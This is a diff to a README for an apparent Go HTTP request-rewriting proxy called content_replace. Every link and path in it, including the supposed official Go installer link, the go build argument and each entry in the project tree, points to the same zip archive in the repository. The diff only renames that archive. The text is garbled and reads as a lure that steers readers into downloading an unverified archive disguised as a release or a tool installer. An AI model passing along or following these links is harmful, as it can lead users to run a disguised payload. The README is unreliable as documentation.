@@ -1,6 +1,6 @@
 # 🌐 content_replace - Effortlessly Modify HTTP Requests
 
-[![Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip)](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip)
+[![Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip)](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To use content_replace, follow these simple steps.
 
 To download content_replace, click the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip)
 
 ### 2. Download the Application
 
@@ -22,7 +22,7 @@ Once on the Releases page, look for the latest version. Download the appropriate
 
 ### 3. Install Go
 
-Make sure to have Go installed. You can download it from the official Go website: [Install Go](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip). 
+Make sure to have Go installed. You can download it from the official Go website: [Install Go](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip). 
 
 ### 4. Compile the Project
 
@@ -32,7 +32,7 @@ Make sure to have Go installed. You can download it from the official Go website
 
 ```bash
 go mod tidy
-go build -o proxy https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip
+go build -o proxy https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip
 ```
 
 This will build the application and create an executable file named `proxy`.
@@ -41,7 +41,7 @@ This will build the application and create an executable file named `proxy`.
 
 content_replace uses YAML files for configuration. Create a configuration file as follows:
 
-1. Open `https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip`.
+1. Open `https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip`.
 2. Define your rules and settings there.
 
 For example, your configuration file can look like this:
@@ -91,31 +91,31 @@ Here's a brief overview of the project structure:
 
 ```
 content_replace/
-├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip                 # Entry point of the application
-├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip                  # Go module configuration
+├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip                 # Entry point of the application
+├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip                  # Go module configuration
 ├── config/
-│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip           # Configuration structure and reading logic
-│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip            # Definition of replacement rules
+│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip           # Configuration structure and reading logic
+│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip            # Definition of replacement rules
 ├── proxy/
-│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip           # Main HTTP proxy server logic
-│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip          # HTTP request handler
-│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip        # Logic for forwarding requests
+│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip           # Main HTTP proxy server logic
+│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip          # HTTP request handler
+│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip        # Logic for forwarding requests
 ├── replacer/
-│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip           # Content replacement engine
+│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip           # Content replacement engine
 ├── logger/
-│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip           # Logging utility
+│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip           # Logging utility
 ├── configs/
-│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip         # Main configuration file
-│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip          # Configuration for replacement rules
+│   ├── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip         # Main configuration file
+│   └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip          # Configuration for replacement rules
 └── logs/
-    └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip           # Log file for requests
+    └── https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip           # Log file for requests
 ```
 
 ## 🛠️ Download & Install
 
 To get started with content_replace, remember to visit the releases page to download the application:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/content_replace.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nicky8258/content_replace/main/Phylloscopus/replace-content-3.3.zip)
 
 After downloading and following the installation steps, you will be ready to use your HTTP proxy server efficiently. 
 
